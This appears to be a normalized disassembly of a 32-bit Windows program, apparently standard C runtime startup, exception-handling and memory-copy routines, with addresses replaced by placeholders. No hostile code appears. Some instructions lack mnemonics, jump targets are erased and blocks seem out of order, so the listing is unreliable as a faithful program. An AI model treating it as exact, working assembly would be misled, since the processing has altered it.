mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov [ eax + rw-data ] 0x2
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push 0x4
pop eax
shl eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push r--data
call sub_40ac4a
mov esp ebp
pop ebp
retn
push 0x2
pop ecx
int 0x29
sub_40ad6d
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
lea edx [ ecx + 0x18 ]
add edx eax
movzx eax [ ecx + 0x6 ]
imul esi eax 0x28
add esi edx
cmp edx esi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
add edx 0x28
cmp edx esi
jne r-xdata
mov eax [ edx + 0x8 ]
add eax [ edx + 0xc ]
cmp ecx eax
jb r-xdata
cmp ecx [ edx + 0xc ]
jb r-xdata
mov eax edx
jmp r-xdata
pop esi
pop ebp
retn
sub_40adb1
call sub_40b50f
test eax eax
jne r-xdata
mov eax [ fs : 0x18 ]
push esi
mov esi rw-data
mov edx [ eax + 0x4 ]
jmp r-xdata
xor al al
retn
xor eax eax
mov ecx edx
[ esi ] ecx
test eax eax
jne r-xdata
cmp edx eax
je r-xdata
xor al al
pop esi
retn
mov al 0x1
pop esi
retn
sub_40ade6
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
call sub_40b36e
call sub_40c67a
test al al
jne r-xdata
mov [ rw-data ] 0x1
call sub_411d14
test al al
jne r-xdata
xor al al
pop ebp
retn
mov al 0x1
pop ebp
retn
push 0x0
call sub_40c6a8
pop ecx
jmp r-xdata
sub_40ae1f
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40b50f
test eax eax
je r-xdata
cmp esi 0x1
jne r-xdata
mov eax [ rw-data ]
lea esi [ ebp - 0xc ]
push edi
and eax 0x1f
mov edi rw-data
push 0x20
pop ecx
sub ecx eax
or eax 0xffffffff
ror eax cl
xor eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi rw-data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
lea esi [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov al 0x1
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
test esi esi
jne r-xdata
push 0x5
call sub_40b0e9
int3
push rw-data
call sub_411bc2
pop ecx
test eax eax
je r-xdata
push rw-data
call sub_411bc2
neg eax
pop ecx
sbb al al
inc al
jmp r-xdata
xor al al
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_40aeb6
push 0x8
push r--data
call sub_40b2f0
and [ ebp - 0x4 ] 0x0
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor al al
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx __dos_header
sub eax ecx
push eax
push ecx
call sub_40ad6d
pop ecx
pop ecx
test eax eax
je r-xdata
test [ eax + 0x24 ] 0x80000000
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov al 0x1
jmp r-xdata
call sub_40b336
retn
sub_40af60
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_411d26
push [ ebp + 0x8 ]
call sub_40c6a8
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
sub_40af88
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ rw-data ]
and ecx 0x1f
push [ ebp + 0x8 ]
ror eax cl
cmp eax 0xffffffff
jne r-xdata
push rw-data
call sub_411bff
pop ecx
call sub_411b8f
jmp r-xdata
neg eax
pop ecx
sbb eax eax
not eax
and eax [ ebp + 0x8 ]
pop ebp
retn
sub_40afd8
push ebp
mov ebp esp
sub esp 0x14
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
mov eax [ rw-data ]
push esi
push edi
mov edi 0xbb40e64e
mov esi 0xffff0000
cmp eax edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
xor [ ebp - 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
xor [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor ecx [ ebp - 0x14 ]
xor ecx [ ebp - 0x4 ]
xor ecx eax
cmp ecx edi
jne r-xdata
test esi eax
je r-xdata
test esi ecx
jne r-xdata
mov ecx 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] ecx
not ecx
mov [ rw-data ] ecx
mov eax ecx
or eax 0x4711
shl eax 0x10
or ecx eax
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_40b0e9
push ebp
mov ebp esp
sub esp 0x324
push ebx
push esi
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor esi esi
lea eax [ ebp - 0x324 ]
push 0x2cc
push esi
push eax
mov [ rw-data ] esi
call sub_40be70
add esp 0xc
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x278 ] ecx
mov [ ebp - 0x27c ] edx
mov [ ebp - 0x280 ] ebx
mov [ ebp - 0x284 ] esi
mov [ ebp - 0x288 ] edi
mov [ ebp - 0x25c ] ss
mov [ ebp - 0x268 ] cs
mov [ ebp - 0x28c ] ds
mov [ ebp - 0x290 ] es
mov [ ebp - 0x294 ] fs
mov [ ebp - 0x298 ] gs
pushfd
pop [ ebp - 0x264 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x26c ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x324 ] 0x10001
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x270 ] eax
lea eax [ ebp - 0x58 ]
push esi
push eax
call sub_40be70
mov eax [ ebp + 0x4 ]
add esp 0xc
mov [ ebp - 0x58 ] 0x40000015
mov [ ebp - 0x54 ] 0x1
mov [ ebp - 0x4c ] eax
call [ IsDebuggerPresent@IAT ]
push esi
lea ebx [ eax - 0x1 ]
neg ebx
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x324 ]
sbb bl bl
mov [ ebp - 0x4 ] eax
inc bl
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
int 0x29
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bl
neg eax
sbb eax eax
and [ rw-data ] eax
sub_40b204
push ebp
mov ebp esp
sub esp 0x44
push 0x44
lea eax [ ebp - 0x44 ]
push 0x0
push eax
call sub_40be70
add esp 0xc
lea eax [ ebp - 0x44 ]
push eax
call [ GetStartupInfoW@IAT ]
test [ ebp - 0x18 ] 0x1
je r-xdata
push 0xa
pop eax
movzx eax [ ebp - 0x14 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_40b243
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_411d97
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
je r-xdata
sub_40b28c
push ebx
push esi
mov esi r--data
mov ebx r--data
cmp esi ebx
jae r-xdata
pop esi
pop ebx
retn
push edi
add esi 0x4
cmp esi ebx
jb r-xdata
mov ecx edi
call j_sub_40c250
call edi
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
sub_40b2b7
push ebx
push esi
mov esi r--data
mov ebx r--data
cmp esi ebx
jae r-xdata
pop esi
pop ebx
retn
push edi
add esi 0x4
cmp esi ebx
jb r-xdata
mov ecx edi
call j_sub_40c250
call edi
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
sub_40b2f0
push sub_40c430
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax

sub_40b34b
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0xc
push esi
call sub_40a894
pop ecx
pop ecx
sub_40b36e
push ebp
mov ebp esp
and [ rw-data ] 0x0
sub esp 0x2c
push ebx
xor ebx ebx
inc ebx
or [ rw-data ] ebx
push 0xa
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
and [ ebp - 0x14 ] 0x0
xor eax eax
or [ rw-data ] 0x2
xor ecx ecx
push esi
push edi
mov [ rw-data ] ebx
lea edi [ ebp - 0x2c ]
push ebx
cpuid
mov esi ebx
pop ebx
mov [ edi ] eax
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
xor ecx 0x49656e69
mov eax [ ebp - 0x24 ]
xor eax 0x6c65746e
or ecx eax
mov eax [ ebp - 0x28 ]
xor eax 0x756e6547
or ecx eax
neg ecx
push 0x1
pop eax
sbb cl cl
push 0x0
add cl 0x1
pop ecx
push ebx
cpuid
mov esi ebx
pop ebx
mov [ edi ] eax
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
je r-xdata
mov edi [ rw-data ]
mov eax [ ebp - 0x2c ]
and eax 0xfff3ff0
cmp eax 0x106c0
je r-xdata
pop edi
pop esi
test eax 0x100000
je r-xdata
push 0x7
pop eax
xor ecx ecx
push ebx
cpuid
mov esi ebx
pop ebx
lea ebx [ ebp - 0x2c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] edx
mov eax [ ebp - 0x28 ]
test eax 0x200
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
je r-xdata
mov edi [ rw-data ]
or edi 0x1
mov [ rw-data ] edi
jmp r-xdata
cmp eax 0x20660
je r-xdata
or [ rw-data ] 0x4
mov [ rw-data ] 0x2
test eax 0x8000000
je r-xdata
or edi 0x2
mov [ rw-data ] edi
cmp [ ebp - 0xc ] 0x7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x18 ] eax
jl r-xdata
cmp eax 0x20670
je r-xdata
test eax 0x10000000
je r-xdata
cmp eax 0x30650
je r-xdata
xor ecx ecx
xgetbv
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
and eax 0x6
xor ecx ecx
cmp eax 0x6
jne r-xdata
cmp eax 0x30660
je r-xdata
test ecx ecx
jne r-xdata
cmp eax 0x30670
jne r-xdata
mov eax [ rw-data ]
or eax 0x8
mov [ rw-data ] 0x3
test [ ebp - 0x14 ] 0x20
mov [ rw-data ] eax
je r-xdata
or eax 0x20
mov [ rw-data ] 0x5
mov [ rw-data ] eax
sub_40b51b
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
lea ecx [ ebp - 0x18 ]
and [ ebp - 0x18 ] 0x0
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_40b757
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_40c800
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov esp ebp
pop ebp
retn
sub_40b57b
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x34 ] sub_40b81a
mov eax [ rw-data ]
lea ecx [ ebp - 0x38 ]
xor eax ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
call sub_40c724
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
call [ r--data ]
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x4 ]
pop ecx
pop ecx
and [ ebp - 0x8 ] 0x0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x38 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
sub_40b658
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0xc ]
mov edx ecx
mov ebx [ edi + 0x10 ]
mov [ ebp - 0x4 ] ecx
test esi esi
js r-xdata
mov eax [ ebp + 0x14 ]
inc ecx
mov [ eax ] ecx
mov eax [ ebp + 0x18 ]
mov [ eax ] edx
cmp edx [ edi + 0xc ]
ja r-xdata
imul eax ecx 0x14
add eax 0x8
add eax ebx
call sub_411d97
cmp ecx edx
ja r-xdata
mov edi [ ebp + 0x10 ]
sub eax 0x14
dec ecx
cmp [ eax - 0x4 ] edi
mov edi [ ebp + 0x8 ]
jge r-xdata
imul eax ecx 0x14
pop edi
pop esi
add eax ebx
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0xffffffff
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi [ eax ]
mov edi [ ebp + 0x8 ]
jle r-xdata
test esi esi
jns r-xdata
mov edx [ ebp - 0x4 ]
dec esi
mov [ ebp - 0x4 ] ecx
cmp ecx 0xffffffff
je r-xdata
sub_40b6d0
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_40b702
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ RtlUnwind@IAT ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40b757
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_40a8ab
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_40d425
add esp 0x20
pop esi
pop ebp
retn
sub_40b788
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
call sub_40c724
mov ecx [ eax + 0x24 ]
mov [ esi + 0x4 ] ecx
call sub_40c724
mov [ eax + 0x24 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_40b7ac
push ebp
mov ebp esp
push esi
call sub_40c724
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x24 ]
jne r-xdata
call sub_40c724
mov ecx [ eax + 0x24 ]
jmp r-xdata
call sub_40c724
mov ecx [ esi + 0x4 ]
mov [ eax + 0x24 ] ecx
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp esi eax
je r-xdata
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx eax
call sub_411d97
pop esi
pop ebp
retn
sub_40b7f4
push ebp
mov ebp esp
call sub_40c724
mov eax [ eax + 0x24 ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_40b81a
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_40a8ab
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_40d425
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_40b57b
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40b702
pop ebx
mov esp ebp
pop ebp
retn
sub_40b8b9
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d425
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40b8f0
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x20
jb r-xdata
cmp edi eax
jb r-xdata
and ecx 0x1f
je r-xdata
cmp ecx 0x80
jae r-xdata
lea esi [ ecx + esi ]
lea edi [ ecx + edi ]
cmp ecx 0x20
jb r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax ecx
shr ecx 0x2
je r-xdata
bt [ rw-data ] 0x1
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
test ecx 0xfffffffc
je r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
add edi 0x4
add esi 0x4
sub ecx 0x1
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
[ edi ] [ esi ]
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test ecx ecx
je r-xdata
jmp r-xdata
test ecx ecx
je r-xdata
sub edi 0x4
sub esi 0x4
mov eax [ esi ]
mov [ edi ] eax
sub ecx 0x4
test ecx 0xfffffffc
jne r-xdata
test edi 0xf
je r-xdata
test edi 0x3
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov edx ecx
shr edx 0x5
test edx edx
je r-xdata
test edi 0x3
je r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
sub edi 0x1
sub esi 0x1
mov al [ esi ]
mov [ edi ] al
sub ecx 0x1
jne r-xdata
cmp ecx 0x80
jb r-xdata
dec ecx
dec esi
dec edi
mov al [ esi ]
mov [ edi ] al
test edi 0xf
jne r-xdata
cmp ecx 0x20
jb r-xdata
mov edx edi
and edx 0x3
sub ecx edx
lea esp [ esp ]
lea ecx [ ecx ]
test edi 0x3
jne r-xdata
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
lea ebx [ ebx ]
mov edx ecx
cmp ecx 0x20
jb r-xdata
mov al [ esi ]
mov [ edi ] al
dec ecx
add esi 0x1
add edi 0x1
test edi 0x3
jne r-xdata
cmp ecx 0x20
jb r-xdata
sub esi 0x80
sub edi 0x80
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu xmm2 [ esi + 0x20 ]
movdqu xmm3 [ esi + 0x30 ]
movdqu xmm4 [ esi + 0x40 ]
movdqu xmm5 [ esi + 0x50 ]
movdqu xmm6 [ esi + 0x60 ]
movdqu xmm7 [ esi + 0x70 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
movdqu [ edi + 0x20 ] xmm2
movdqu [ edi + 0x30 ] xmm3
movdqu [ edi + 0x40 ] xmm4
movdqu [ edi + 0x50 ] xmm5
movdqu [ edi + 0x60 ] xmm6
movdqu [ edi + 0x70 ] xmm7
sub ecx 0x80
test ecx 0xffffff80
jne r-xdata
mov edx ecx
shr ecx 0x2
and edx 0x3
sub esi 0x4
sub edi 0x4
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + r-xdata ]
mov al [ esi - 0x1 ]
mov [ edi - 0x1 ] al
dec esi
dec edi
sub edx 0x1
jne r-xdata
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
lea esi [ esi + 0x20 ]
lea edi [ edi + 0x20 ]
dec edx
jne r-xdata
shr ecx 0x2
[ edi ] [ esi ]
and edx 0x3
jmp [ edx * 4 + r-xdata ]
sub esi 0x20
sub edi 0x20
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
sub ecx 0x20
test ecx 0xffffffe0
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
lea esp [ esp ]
mov edi edi
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov edi edi
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + r-xdata ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_40be70
mov ecx [ esp + 0xc ]
movzx eax [ esp + 0x8 ]
mov edx edi
mov edi [ esp + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x4 ]
mov edi edx
retn
